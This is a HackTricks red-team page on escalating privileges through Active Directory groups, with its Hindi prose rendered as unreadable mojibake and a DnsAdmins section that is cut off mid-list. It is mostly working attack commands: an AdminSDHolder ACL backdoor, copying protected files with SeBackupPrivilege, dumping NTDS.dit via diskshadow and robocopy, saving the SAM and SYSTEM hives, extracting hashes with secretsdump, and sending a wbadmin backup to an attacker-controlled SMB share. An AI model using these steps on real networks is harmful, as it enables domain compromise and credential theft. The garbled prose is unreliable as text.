# рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рд╕рдореВрд╣

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) рдХреЗ рд╕рд╛рде рд╢реВрдиреНрдп рд╕реЗ рдирд╛рдпрдХ рддрдХ AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдУрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ**](https://peass.creator-spring.com)
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ **Twitter** ЁЯРж рдкрд░ рдореБрдЭреЗ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **HackTricks** рдХреЗ [**github repos**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рддрд░рдХреАрдмреЗрдВ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред

</details>

## рдкреНрд░рд╢рд╛рд╕рди рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рд╡рд╛рд▓реЗ рдЬреНрдЮрд╛рдд рд╕рдореВрд╣

* **Administrators**
* **Domain Admins**
* **Enterprise Admins**

рд╕реБрд░рдХреНрд╖рд╛ рдореВрд▓реНрдпрд╛рдВрдХрди рдХреЗ рджреМрд░рд╛рди рдПрдХрд╛рдзрд┐рдХ рд╣рдорд▓реЗ рдХреЗ рд╡реЗрдХреНрдЯрд░реЛрдВ рдХреЛ рдЬреЛрдбрд╝рддреЗ рд╕рдордп рдЕрдиреНрдп рдЦрд╛рддрд╛ рд╕рджрд╕реНрдпрддрд╛ рдФрд░ рдПрдХреНрд╕реЗрд╕ рдЯреЛрдХрди рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рднреА рдЙрдкрдпреЛрдЧреА рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВред

## Account Operators <a href="#account-operators" id="account-operators"></a>

* рдбреЛрдореЗрди рдкрд░ рдЧреИрд░ рдкреНрд░рд╢рд╛рд╕рдХ рдЦрд╛рддреЛрдВ рдФрд░ рд╕рдореВрд╣реЛрдВ рдХреЛ рдмрдирд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ
* DC рдореЗрдВ рд╕реНрдерд╛рдиреАрдп рд░реВрдк рд╕реЗ рд▓реЙрдЧ рдЗрди рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ

рд╕рдореВрд╣ рдХреЗ **рд╕рджрд╕реНрдпреЛрдВ** рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ:
```powershell
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ 'spotless' рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рд╕рджрд╕реНрдпрддрд╛:

![](<../../.gitbook/assets/1 (2) (1) (1).png>)

рд╣рд╛рд▓рд╛рдВрдХрд┐, рд╣рдо рдЕрднреА рднреА рдирдП рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЬреЛрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВ:

![](../../.gitbook/assets/a2.png)

рд╕рд╛рде рд╣реА DC01 рдореЗрдВ рд╕реНрдерд╛рдиреАрдп рд░реВрдк рд╕реЗ рд▓реЙрдЧрд┐рди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

![](../../.gitbook/assets/a3.png)

## AdminSDHolder рд╕рдореВрд╣

**AdminSDHolder** рдСрдмреНрдЬреЗрдХреНрдЯ рдХреА рдПрдХреНрд╕реЗрд╕ рдХрдВрдЯреНрд░реЛрд▓ рд▓рд┐рд╕реНрдЯ (ACL) рдХрд╛ рдЙрдкрдпреЛрдЧ рдПрдХреНрдЯрд┐рд╡ рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдореЗрдВ рд╕рднреА "рд╕реБрд░рдХреНрд╖рд┐рдд рд╕рдореВрд╣реЛрдВ" рдФрд░ рдЙрдирдХреЗ рд╕рджрд╕реНрдпреЛрдВ рдХреЛ **рдЕрдиреБрдорддрд┐рдпрд╛рдВ** **рдХреЙрдкреА** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдЯреЗрдореНрдкрд▓реЗрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рд╕реБрд░рдХреНрд╖рд┐рдд рд╕рдореВрд╣реЛрдВ рдореЗрдВ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рд╕рдореВрд╣ рдЬреИрд╕реЗ рдХрд┐ рдбреЛрдореЗрди рдПрдбрдорд┐рдиреНрд╕, рдПрдбрдорд┐рдирд┐рд╕реНрдЯреНрд░реЗрдЯрд░реНрд╕, рдПрдВрдЯрд░рдкреНрд░рд╛рдЗрдЬ рдПрдбрдорд┐рдиреНрд╕, рдФрд░ рд╕реНрдХреАрдорд╛ рдПрдбрдорд┐рдиреНрд╕ рд╢рд╛рдорд┐рд▓ рд╣реИрдВред\
рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ, рдЗрд╕ рд╕рдореВрд╣ рдХреА ACL рдХреЛ рд╕рднреА "рд╕реБрд░рдХреНрд╖рд┐рдд рд╕рдореВрд╣реЛрдВ" рдХреЗ рдЕрдВрджрд░ рдХреЙрдкреА рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣ рдЗрди рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╕рдореВрд╣реЛрдВ рдореЗрдВ рдЬрд╛рдирдмреВрдЭрдХрд░ рдпрд╛ рдЖрдХрд╕реНрдорд┐рдХ рдкрд░рд┐рд╡рд░реНрддрдиреЛрдВ рд╕реЗ рдмрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрджрд┐ рдХреЛрдИ рд╣рдорд▓рд╛рд╡рд░ рд╕рдореВрд╣ **AdminSDHolder** рдХреА ACL рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рддрд╛ рд╣реИ, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдПрдХ рд╕рд╛рдорд╛рдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдкреВрд░реНрдг рдЕрдиреБрдорддрд┐рдпрд╛рдВ рджреЗрддрд╛ рд╣реИ, рддреЛ рдпрд╣ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕реБрд░рдХреНрд╖рд┐рдд рд╕рдореВрд╣ рдХреЗ рдЕрдВрджрд░ рд╕рднреА рд╕рдореВрд╣реЛрдВ рдкрд░ рдкреВрд░реНрдг рдЕрдиреБрдорддрд┐рдпрд╛рдВ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд▓реЗрдЧрд╛ (рдПрдХ рдШрдВрдЯреЗ рдореЗрдВ)ред\
рдФрд░ рдпрджрд┐ рдХреЛрдИ рдЗрд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдбреЛрдореЗрди рдПрдбрдорд┐рдиреНрд╕ рд╕реЗ рд╣рдЯрд╛рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддрд╛ рд╣реИ (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП) рдПрдХ рдШрдВрдЯреЗ рдпрд╛ рдЙрд╕рд╕реЗ рдХрдо рд╕рдордп рдореЗрдВ, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдлрд┐рд░ рд╕реЗ рд╕рдореВрд╣ рдореЗрдВ рд╡рд╛рдкрд╕ рдЖ рдЬрд╛рдПрдЧрд╛ред

рд╕рдореВрд╣ рдХреЗ **рд╕рджрд╕реНрдпреЛрдВ** рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ:
```powershell
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
```
рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ **AdminSDHolder** рд╕рдореВрд╣ рдореЗрдВ рдЬреЛрдбрд╝реЗрдВ:
```powershell
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
```
рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ **Domain Admins** рд╕рдореВрд╣ рдХреЗ рдЕрдВрджрд░ рд╣реИ:
```powershell
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```
рдпрджрд┐ рдЖрдк рдПрдХ рдШрдВрдЯреЗ рдХреА рдкреНрд░рддреАрдХреНрд╖рд╛ рдирд╣реАрдВ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдПрдХ PS рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рддреБрд░рдВрдд рд░рд┐рд╕реНрдЯреЛрд░ рдХрд░рд╡рд╛ рд╕рдХрддреЗ рд╣реИрдВ: [https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1)

[**ired.team рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реАред**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)

## **AD рд░реАрд╕рд╛рдпрдХрд▓ рдмрд┐рди**

рдпрд╣ рд╕рдореВрд╣ рдЖрдкрдХреЛ рд╣рдЯрд╛рдП рдЧрдП AD рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЛ рдкрдврд╝рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред рд╡рд╣рд╛рдВ рдХреБрдЫ рд░рд╕рджрд╛рд░ рдЬрд╛рдирдХрд╛рд░реА рдорд┐рд▓ рд╕рдХрддреА рд╣реИ:
```bash
#This isn't a powerview command, it's a feature from the AD management powershell module of Microsoft
#You need to be in the "AD Recycle Bin" group of the AD to list the deleted AD objects
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
### рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░ рдкрд╣реБрдБрдЪ

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рд╣рдо рд╡рд░реНрддрдорд╛рди рд╕рджрд╕реНрдпрддрд╛ рдХреЗ рд╕рд╛рде DC рдкрд░ рдлрд╛рдЗрд▓реЛрдВ рддрдХ рдХреИрд╕реЗ рдкрд╣реБрдБрдЪ рдирд╣реАрдВ рд╕рдХрддреЗ рд╣реИрдВ:

![](../../.gitbook/assets/a4.png)

рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрджрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ `Server Operators` рдХрд╛ рд╕рджрд╕реНрдп рд╣реИ:

![](../../.gitbook/assets/a5.png)

рдХрд╣рд╛рдиреА рдмрджрд▓ рдЬрд╛рддреА рд╣реИ:

![](../../.gitbook/assets/a6.png)

### рдкреНрд░рд┐рд╡реЗрд╕реНрдХ <a href="#backup-operators" id="backup-operators"></a>

рд╕реЗрд╡рд╛ рдкрд░ рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреА рдЬрд╛рдБрдЪ рдХреЗ рд▓рд┐рдП Sysinternals рд╕реЗ [`PsService`](https://docs.microsoft.com/en-us/sysinternals/downloads/psservice) рдпрд╛ `sc` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред
```
C:\> .\PsService.exe security AppReadiness

PsService v2.25 - Service information and configuration utility
Copyright (C) 2001-2010 Mark Russinovich
Sysinternals - www.sysinternals.com

[...]

[ALLOW] BUILTIN\Server Operators
All
```
рдпрд╣ рдкреБрд╖реНрдЯрд┐ рдХрд░рддрд╛ рд╣реИ рдХрд┐ Server Operators рд╕рдореВрд╣ рдХреЗ рдкрд╛рд╕ [SERVICE\_ALL\_ACCESS](https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) рдкрд╣реБрдБрдЪ рдЕрдзрд┐рдХрд╛рд░ рд╣реИ, рдЬреЛ рд╣рдореЗрдВ рдЗрд╕ рд╕реЗрд╡рд╛ рдкрд░ рдкреВрд░реНрдг рдирд┐рдпрдВрддреНрд░рдг рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред
рдЖрдк рдЗрд╕ рд╕реЗрд╡рд╛ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ [**рд╕реЗрд╡рд╛ рдХреЛ рдордирдорд╛рдиреЗ рдЖрджреЗрд╢ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░реЗрд░рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#modify-service-binary-path) рдФрд░ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдмрдврд╝рд╛ рд╕рдХрддреЗ рд╣реИрдВред

## Backup Operators <a href="#backup-operators" id="backup-operators"></a>

`Server Operators` рд╕рджрд╕реНрдпрддрд╛ рдХреЗ рд╕рдорд╛рди, рдпрджрд┐ рд╣рдо `Backup Operators` рдХреЗ рд╕рджрд╕реНрдп рд╣реИрдВ рддреЛ рд╣рдо **`DC01` рдлрд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рддрдХ рдкрд╣реБрдБрдЪ рд╕рдХрддреЗ рд╣реИрдВ**ред

рдпрд╣ рдЗрд╕рд▓рд┐рдП рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рд╕рдореВрд╣ рдЕрдкрдиреЗ **рд╕рджрд╕реНрдпреЛрдВ** рдХреЛ [**`SeBackup`**](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#sebackupprivilege-3.1.4) рдФрд░ [**`SeRestore`**](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#serestoreprivilege-3.1.5) рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред **SeBackupPrivilege** рд╣рдореЗрдВ рдХрд┐рд╕реА рднреА рдлреЛрд▓реНрдбрд░ рдХреЛ **рдкрд╛рд░ рдХрд░рдиреЗ рдФрд░ рд╕реВрдЪреА** рдмрдирд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред рдпрд╣ рд╣рдореЗрдВ рдХрд┐рд╕реА рдлреЛрд▓реНрдбрд░ рд╕реЗ **рдлрд╛рдЗрд▓ рдХреА рдкреНрд░рддрд┐рд▓рд┐рдкрд┐ рдмрдирд╛рдиреЗ** рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдЧрд╛, рднрд▓реЗ рд╣реА рдЕрдиреНрдп рдХреЛрдИ рдЕрдиреБрдорддрд┐ рди рджреЗ рд░рд╣рд╛ рд╣реЛред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЗрд╕ рдЕрдиреБрдорддрд┐ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдлрд╛рдЗрд▓ рдХреА рдкреНрд░рддрд┐рд▓рд┐рдкрд┐ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП [**FILE\_FLAG\_BACKUP\_SEMANTICS**](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea) \*\*\*\* рдлреНрд▓реИрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдПред рдЗрд╕рд▓рд┐рдП, рд╡рд┐рд╢реЗрд╖ рдЙрдкрдХрд░рдгреЛрдВ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред

рдЗрд╕ рдЙрджреНрджреЗрд╢реНрдп рдХреЗ рд▓рд┐рдП рдЖрдк [**рдпреЗ рд╕реНрдХреНрд░рд┐рдкреНрдЯреНрд╕**](https://github.com/giuliano108/SeBackupPrivilege)** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред**

рд╕рдореВрд╣ рдХреЗ **рд╕рджрд╕реНрдпреЛрдВ** рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ:
```powershell
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### **рд╕реНрдерд╛рдиреАрдп рд╣рдорд▓рд╛**
```bash
# Import libraries
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
Get-SeBackupPrivilege # ...or whoami /priv | findstr Backup SeBackupPrivilege is disabled

# Enable SeBackupPrivilege
Set-SeBackupPrivilege
Get-SeBackupPrivilege

# List Admin folder for example and steal a file
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\\report.pdf c:\temp\x.pdf -Overwrite
```
### AD рд╣рдорд▓рд╛

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдЖрдк рд╕реАрдзреЗ рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░ рдлрд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рддрдХ рдкрд╣реБрдБрдЪ рд╕рдХрддреЗ рд╣реИрдВ:

![](../../.gitbook/assets/a7.png)

рдЖрдк рдЗрд╕ рдкрд╣реБрдБрдЪ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ **`NTDS.dit`** рдПрдХреНрдЯрд┐рд╡ рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдбреЗрдЯрд╛рдмреЗрд╕ рдХреЛ **рдЪреБрд░рд╛рдиреЗ** рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдбреЛрдореЗрди рдореЗрдВ рд╕рднреА рдпреВрдЬрд░ рдФрд░ рдХрдВрдкреНрдпреВрдЯрд░ рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдХреЗ рд╕рднреА **NTLM рд╣реИрд╢реЗрдЬ** рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХреЗрдВред

#### diskshadow.exe рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ NTDS.dit рдбрдВрдк рдХрд░рдирд╛

[**diskshadow**](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк **`C` рдбреНрд░рд╛рдЗрд╡** рдХреА рдПрдХ рд╢реИрдбреЛ рдХреЙрдкреА **рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ** рдФрд░ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП `F` рдбреНрд░рд╛рдЗрд╡ рдореЗрдВ рднреАред рдлрд┐рд░, рдЖрдк рдЗрд╕ рд╢реИрдбреЛ рдХреЙрдкреА рд╕реЗ `NTDS.dit` рдлрд╛рдЗрд▓ рдХреЛ рдЪреБрд░рд╛ рд╕рдХрддреЗ рд╣реИрдВ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рд╕рд┐рд╕реНрдЯрдо рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдореЗрдВ рдирд╣реАрдВ рд╣реЛрдЧреА:
```
diskshadow.exe

Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC,  10/14/2020 10:34:16 AM

DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% F:
DISKSHADOW> end backup
DISKSHADOW> exit
```
рд▓реЛрдХрд▓ рдЕрдЯреИрдХ рдХреА рддрд░рд╣, рдЖрдк рдЕрдм рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдлрд╛рдЗрд▓ **`NTDS.dit`** рдХреА рдкреНрд░рддрд┐рд▓рд┐рдкрд┐ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ:
```
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
рдлрд╛рдЗрд▓реЛрдВ рдХреЛ рдХреЙрдкреА рдХрд░рдиреЗ рдХрд╛ рдПрдХ рдФрд░ рддрд░реАрдХрд╛ рд╣реИ [**robocopy**](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛:**
```
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
рддрдм, рдЖрдк рдЖрд╕рд╛рдиреА рд╕реЗ **SYSTEM** рдФрд░ **SAM** рдХреЛ **рдЪреБрд░рд╛** рд╕рдХрддреЗ рд╣реИрдВ:
```
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
рдЕрдВрдд рдореЗрдВ рдЖрдк **`NTDS.dit`** рд╕реЗ **рд╕рднреА рд╣реИрд╢реЗрдЬ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
#### wbadmin.exe рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ NTDS.dit рдбрдВрдк рдХрд░рдирд╛

wbadmin.exe рдХрд╛ рдЙрдкрдпреЛрдЧ diskshadow.exe рдХреЗ рд╕рдорд╛рди рд╣реИ, wbadmin.exe рдЙрдкрдХрд░рдг рдПрдХ рдХрдорд╛рдВрдб рд▓рд╛рдЗрди рдЙрдкрдпреЛрдЧрд┐рддрд╛ рд╣реИ рдЬреЛ Windows рдореЗрдВ рдмрдирд╛рдИ рдЧрдИ рд╣реИ, Windows Vista/Server 2008 рд╕реЗ рд╢реБрд░реВ рд╣реЛрдХрд░ред

рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ, рдЖрдкрдХреЛ рд╣рдорд▓рд╛рд╡рд░ рдорд╢реАрди рдкрд░ [**smb рд╕рд░реНрд╡рд░ рдХреЗ рд▓рд┐рдП ntfs рдлрд╛рдЗрд▓рд╕рд┐рд╕реНрдЯрдо рд╕реЗрдЯрдЕрдк**](https://gist.github.com/manesec/9e0e8000446b966d0f0ef74000829801) рдХрд░рдирд╛ рд╣реЛрдЧрд╛ред

рдЬрдм рдЖрдк smb рд╕рд░реНрд╡рд░ рд╕реЗрдЯрдЕрдк рдХрд░ рд▓реЗрддреЗ рд╣реИрдВ, рддреЛ рдЖрдкрдХреЛ рд▓рдХреНрд╖реНрдп рдорд╢реАрди рдкрд░ smb рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдХреЛ рдХреИрд╢ рдХрд░рдирд╛ рд╣реЛрдЧрд╛:
```
# cache the smb credential.
net use X: \\<AttackIP>\sharename /user:smbuser password

# check if working.
dir X:\
```
рдпрджрд┐ рдХреЛрдИ рддреНрд░реБрдЯрд┐ рдирд╣реАрдВ рд╣реИ, рддреЛ рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП wbadmin.exe рдХрд╛ рдкреНрд░рдпреЛрдЧ рдХрд░реЗрдВ:
```
# Start backup the system.
# In here, no need to use `X:\`, just using `\\<AttackIP>\sharename` should be ok.
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds

# Look at the backup version to get time.
wbadmin get versions

# Restore the version to dump ntds.dit.
echo "Y" | wbadmin start recovery -version:10/09/2023-23:48 -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```
рдпрджрд┐ рдпрд╣ рд╕рдлрд▓ рд╣реЛрддрд╛ рд╣реИ, рддреЛ рдпрд╣ `C:\ntds.dit` рдореЗрдВ рдбрдВрдк рдХрд░ рджреЗрдЧрд╛ред

[рдбреЗрдореЛ рд╡реАрдбрд┐рдпреЛ рдЖрдИрдкреАрдкреАрдПрд╕рдИрд╕реА рдХреЗ рд╕рд╛рде](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s)

## DnsAdmins

рдЬреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ **DNSAdmins** рд╕рдореВрд╣ рдХрд╛ рд╕рджрд╕реНрдп рд╣реИ рдпрд╛ рдПрдХ DNS рд╕рд░реНрд╡рд░ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЗ рд▓рд┐рдП **рд▓рд┐рдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐рдпрд╛рдВ** рд░рдЦрддрд╛ рд╣реИ, рд╡рд╣ **DNS рд╕рд░реНрд╡рд░** рдкрд░ **SYSTEM** рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рд╕рд╛рде рдПрдХ **рдордирдорд╛рдиреА DLL** рд▓реЛрдб рдХрд░ рд╕рдХрддрд╛ рд╣реИред\
рдпрд╣ рдмрд╣реБрдд рджрд┐рд▓рдЪрд╕реНрдк рд╣реИ рдХреНрдпреЛрдВрдХрд┐ **рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░реНрд╕** рдХрд╛ рдЙрдкрдпреЛрдЧ **DNS рд╕рд░реНрд╡рд░реЛрдВ** рдХреЗ рд░реВрдк рдореЗрдВ рдмрд╣реБрдд рдмрд╛рд░ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

рдЗрд╕ [**рдкреЛрд╕реНрдЯ**](https://adsecurity.org/?p=4064) рдореЗрдВ рджрд┐рдЦрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдЬрдм DNS рдПрдХ рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░ рдкрд░ рдЪрд▓рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ (рдЬреЛ рдмрд╣реБрдд рдЖрдо рд╣реИ), рддреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╣рдорд▓рд╛ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:

* DNS рдкреНрд░рдмрдВрдзрди RPC рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ
